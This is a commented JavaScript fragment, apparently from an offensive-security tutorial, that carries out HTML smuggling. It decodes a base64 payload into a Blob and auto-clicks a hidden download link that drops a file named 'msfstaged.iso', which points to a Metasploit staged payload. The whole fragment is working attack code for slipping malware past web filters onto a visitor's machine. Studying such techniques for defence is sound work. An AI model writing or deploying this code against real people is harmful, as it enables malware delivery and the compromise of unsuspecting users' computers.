        // this function that converts the file back to its original form and stores it into a byte array
        function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        // calls base64ToArrayBuffer fuction and put payload into data 
        var data = base64ToArrayBuffer(file);
        //The Blob object represents a blob, which is a file-like object of immutable, raw data;

        // place array buffer into blob;
        var blob = new Blob([data], { type: 'octet/stream' });

        var fileName = 'msfstaged.iso';
        // create an anchor element 'a' tag
        var a = document.createElement('a'); 
        // append 'a' tag to body
        document.body.appendChild(a); 
         // make 'a' tag hidden
        a.style = 'display: none';
        // data contained into blob moved to href reference of our 'a' tag 
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        // code of href given a name that fileName variable contain
        a.download = fileName;
        // click action to a tag to download the file
        a.click(); 
        // Call this method when you've finished using an object URL to let the browser know not to keep the reference to the file any longer.
        window.URL.revokeObjectURL(url);
